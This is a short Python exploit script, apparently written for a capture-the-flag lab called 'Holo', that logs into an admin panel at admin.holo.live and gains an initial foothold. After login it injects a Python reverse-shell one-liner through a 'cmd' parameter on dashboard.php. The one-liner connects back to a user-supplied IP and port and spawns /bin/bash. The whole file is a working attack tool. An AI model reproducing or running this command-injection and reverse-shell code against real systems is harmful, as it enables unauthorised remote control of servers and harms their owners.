import requests
import sys
import argparse

def login(creds, url, session):
    
    print("(+) Logging in.")

    login_page = url + "action_page.php"    
    hostname = {"Host" : "admin.holo.live"}

    
    r = session.get(login_page, params=creds, headers=hostname, allow_redirects=False)

    location_header = r.headers.get("Location")

    if r.headers.get("Location") == "dashboard.php":
        print("(+) Logged in successfully!")

        shell(url, hostname, session)

    else:
        print("(-) Logging failed!")
        print("(-) Exiting")
        sys.exit(1)

def shell(url, hostname, session):

    print("(+) Getting a reverse shell!")

    lhost = input("Enter your ip address: ")
    lport = input("Enter your listening port: ")

    url = url + "dashboard.php"
    payload = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' '''
    params = {"cmd": payload}

    try:
        session.get(url, params=params, headers=hostname, timeout=2)

        sys.exit(0)
    except requests.exceptions.Timeout:
        pass
    
    print("(+) Check your listener.")

def main():

    example = '''
    Example:
        python3 holo.py -i 10.200.144.33 -u admin -p adminpassword
    '''

    parser = argparse.ArgumentParser(description="Get initial foothold on Holo.", epilog=example, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-i', help="Target ip address", required=True, metavar='ip')
    parser.add_argument('-u', help="Username", required=True, metavar='username')
    parser.add_argument('-p', help="Password", required=True, metavar='password')
    args = parser.parse_args()

    url = f"http://{args.i}/"
    creds = {"user" : args.u, "password" : args.p}
    session = requests.Session()

    login(creds, url, session)

if __name__ == "__main__":
    main()